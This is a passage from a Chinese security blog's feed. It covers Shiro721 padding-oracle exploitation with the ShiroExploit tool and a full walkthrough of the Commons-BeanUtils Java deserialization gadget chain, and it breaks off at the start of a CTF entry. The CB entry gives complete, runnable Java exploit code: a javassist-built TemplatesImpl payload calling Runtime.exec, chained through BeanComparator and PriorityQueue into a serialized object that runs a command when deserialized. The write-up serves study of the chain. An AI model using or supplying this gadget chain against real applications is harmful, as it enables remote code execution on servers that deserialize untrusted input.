alt="image-20230620163925489"></p><p>在接着跟进<code>init</code></p><p><img src="../images/image-20230620163954395.png" alt="image-20230620163954395"></p><p><img src="../images/image-20230620164051151.png" alt="image-20230620164051151"></p><p>获取完新的key之后，回到这里进行编码</p><p><img src="../images/image-20230620164134997.png" alt="image-20230620164134997"></p><p><img src="../images/image-20230620164158552.png" alt="image-20230620164158552"></p><p>加密方法还是<code>AES</code></p><p><img src="../images/image-20230620164246098.png" alt="image-20230620164246098"></p><p>最后跟进这个<code>setCipherKey</code>   就是将新生成的key来作为加密和解密的key</p><p><strong>至此就是Shiro721完整的密钥生成过程。</strong></p><h4 id="布尔条件"><a href="#布尔条件" class="headerlink" title="布尔条件"></a>布尔条件</h4><p>我们知道，Padding Oracle Attack攻击是一种类似于sql盲注的攻击，这就要求服务器端有能够被我们利用的布尔条件。在<a href="https://goodapple.top/2022/01/06/6db157fde87a6bae/">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a>这篇文章中，我们模拟的服务器环境如下</p><ul><li>当收到一个有效的密文（一个被正确填充并包含有效数据的密文）时，应用程序正常响应（200 OK）</li><li>当收到无效的密文时（解密时填充错误的密文），应用程序会抛出加密异常（500 内部服务器错误）</li><li>当收到一个有效密文（解密时正确填充的密文）但解密为无效值时，应用程序会显示自定义错误消息 (200 OK)</li></ul><p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的Cookie，Shiro是怎么处理的呢？</p><p>(<strong>这里的话<code>Padding Oracle Attack</code>就不详细分析了，只讲结论</strong>)</p><ul><li><strong>Padding正确，服务器正常响应</strong></li><li><strong>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></strong></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在Shiro550中，我们可以直接通过硬编码密钥直接生成攻击密文。但是Shiro721使用了动态密钥，无法直接获取密钥。但是仍然可以通过Padding Oracle Attack绕过密钥，直接生成攻击密文。</p><p>利用链和Shiro550类似，这里我们使用<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">ShiroExploit.V2.51</a>工具进行攻击测试。输入测试网址以及登录用户的Cookie</p><p><strong>然后就可以利用工具进行测试了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\ShiroExploit.jar</span><br></pre></td></tr></table></figure><p><strong>这是我的启动方式  (因为环境变量是17，用不了)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://juejin.cn/post/7133959651653058574&quot;&gt;参考文章1&lt;/a&gt;     &lt;a href=&quot;https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.</summary>
      
    
    
    
    
    <category term="java-shiro" scheme="https://ke1nys.github.io/tags/java-shiro/"/>
    
  </entry>
  
  <entry>
    <title>java-Commons-BeanUtils</title>
    <link href="https://ke1nys.github.io/posts/f52590e9.html"/>
    <id>https://ke1nys.github.io/posts/f52590e9.html</id>
    <published>2023-06-18T09:46:01.000Z</published>
    <updated>2023-06-18T13:18:50.556Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.viewofthai.link/2022/04/17/apache-commons-beanutils-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90-%EF%BC%88cb%E9%93%BE%EF%BC%89-%E5%AD%A6%E4%B9%A0/">参考文章</a></p><p>最近就是想把不会的链子都跟一遍，现在就先打<code>cb</code>链入手</p><p><strong>全称</strong>(<code>Apache Commons BeanUtils</code>)</p><p>这个链子还可以用来打<code>shiro</code>无依赖的链子</p><p>这个类可以任意触发<code>getter</code>和<code>setter</code>方法</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20220416150822209.png" alt="img"></p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.xml.internal.ws.policy.sourcemodel.wspolicy.XmlToken.Name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;catalina&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">person</span> <span class="variable">person1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person1, <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618182435313.png" alt="image-20230618182435313"></p><p>成功触发</p><p><strong>先打个断点</strong></p><p><img src="../images/image-20230618182504133.png" alt="image-20230618182504133"></p><p>跟进<code>getProperty</code></p><p><img src="../images/image-20230618182536490.png" alt="image-20230618182536490"></p><p>接着跟进<code>getProperty</code></p><p><img src="../images/image-20230618182605765.png" alt="image-20230618182605765"></p><p>然后跟进<code>getNestedProperty</code></p><p><img src="../images/image-20230618183006965.png" alt="image-20230618183006965"></p><p>(<strong>前面的判断是判断bean是否是Map的实例和name是否被映射或索引了</strong>)</p><p>然后全不是</p><p>然后跟进<code>getSimpleProperty</code></p><p><img src="../images/image-20230618183254070.png" alt="image-20230618183254070"></p><p><img src="../images/image-20230618183329271.png" alt="image-20230618183329271"></p><p>然后经过这个<code>getPropertyDescriptor</code>方法</p><p>可以看到，我们传入的是 <code>name</code> ，这里返回 <code>Bean</code> 属性值是 <code>Name</code> ，并且 <code>set</code> 方法与 <code>get</code> 方法都是 <code>setName</code> , <code>getName</code> ，这是 <code>JavaBean</code> 的命名格式，会将传进来的小写<strong>首字母大写</strong></p><p>(<strong>这是一种特性  不能直接传大写的属性  这样的会报错</strong>)</p><p><img src="../images/image-20230618183809387.png" alt="image-20230618183809387"></p><p>接着跟进这个<code>invokeMethod</code>方法</p><p><img src="../images/image-20230618183841914.png" alt="image-20230618183841914"></p><p>最后就会在这个进行调用  </p><p>结束</p><p>这就是<code>cb</code>链调用任意<code>getter</code>的流程</p><p><strong>这里注意的一点就是</strong></p><p><img src="../images/image-20230618184101138.png" alt="image-20230618184101138"></p><p>在传参的时候，虽然函数名是大写的<code>Name</code>,我们也不能直接传大写的(<strong>这是java bean的特性</strong>)   <strong>他会在触发invoke的途中帮我们修改过来</strong></p><p>这就是他调用任意<code>getter</code>的过程</p><p><strong>那么我们可以猜想到哪条链子可以配这cb链来使用呢</strong></p><p>这里的话刚好有个类可以办到</p><p><strong>TemplatesImpl类-&gt;调用恶意类</strong>    <strong>就是这个类，最后会调用动态类加载来执行恶意代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;getOutputProperties()</span><br><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">        TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">            TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">                TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><p>这里的<code>getOutputProperties</code>()刚好可以通过<code>cb</code>链来触发</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        System.out.println(PropertyUtils.getProperty(templates, <span class="string">&quot;outputProperties&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618195517461.png" alt="image-20230618195517461"></p><p>成功执行</p><p><strong>注意因为之前说的 <code>JavaBean</code> 特性， <code>OutputProperties</code> 首字母要小写</strong></p><p>接下来我们就得想办法看谁能触发这个了<code>PropertyUtils.getProperty</code></p><p> <code>BeanComparator.compare</code> 这个类刚好可以办到</p><p><img src="../images/image-20230618200112993.png" alt="image-20230618200112993"></p><p>并且<code>this.property</code>这个属性的值还可控</p><p><img src="../images/image-20230618200225030.png" alt="image-20230618200225030"></p><p><img src="../images/image-20230618200323289.png" alt="image-20230618200323289"></p><p><strong>那么最后一步就差个反序列化<code>readobject</code>()入口</strong>了   </p><p>就是找哪个类的<code>readobject</code>()方法能触发这个<code>compare</code>方法了</p><p>最后在以前的<code>cc4</code>利用链找到了</p><p><img src="../images/image-20230618200609016.png" alt="image-20230618200609016"></p><p>刚好在<code>PriorityQueue</code>这个类里的<code>readobject</code>()方法可以触发<code>compare</code>方法</p><p><img src="../images/image-20230618201614588.png" alt="image-20230618201614588"></p><p>并且这个<code>comparator</code>可控，所以传参为<code>BeanComparator</code>就行了</p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span>  Object  <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object target, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> target.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(target,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(PropertyUtils.getProperty(templates, &quot;outputProperties&quot;));</span></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">outputProperties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"><span class="comment">//        outputProperties.compare(templates,new TemplatesImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">ioTransformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(ioTransformingComparator);</span><br><span class="line">        <span class="comment">//这里是先给一个没啥用的comparator，为了避免在add的时候会执行</span></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//给queue数组传值</span></span><br><span class="line">        setValue(priorityQueue, <span class="string">&quot;comparator&quot;</span>, outputProperties);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230618210616955.png" alt="image-20230618210616955"></p><p>这里的解释一下为啥要给<code>priorityQueue</code>的<code>comparator</code>二次赋值</p><p>因为在第二次<code>add</code>的时候</p><p><img src="../images/image-20230618210749196.png" alt="image-20230618210749196"></p><p>会调用到<code>add</code>里的<code>offer</code>方法里的<code>siftUp</code>方法</p><p><img src="../images/image-20230618210902066.png" alt="image-20230618210902066"></p><p>继续跟进，因为<code>comparator</code>不为空</p><p>所以跟进这个方法</p><p><img src="../images/image-20230618210920053.png" alt="image-20230618210920053"></p><p><strong>刚好，这也可以触发  所以为了避免这个问题  我们就在序列化的时候执行到这的时候先给一个没用的值，等这里执行结束的在利用反射重新赋值</strong></p><p><img src="../images/image-20230618211221232.png" alt="image-20230618211221232"></p><p>最后就是在这里来触发了</p><p><strong>结束</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.viewofthai.link/2022/04/17/apache-commons-beanutils-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90-%EF%BC%88</summary>
      
    
    
    
    
    <category term="java-Commons-BeanUtils" scheme="https://ke1nys.github.io/tags/java-Commons-BeanUtils/"/>
    
  </entry>
  
  <entry>
    <title>hsctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/f8ee282a.html"/>
    <id>https://ke1nys.github.io/posts/f8ee282a.html</id>
    <published>2023-06-16T12:11:25.000Z</published>
    <updated>2023-06-18T13:18:50.553Z</updated>
    
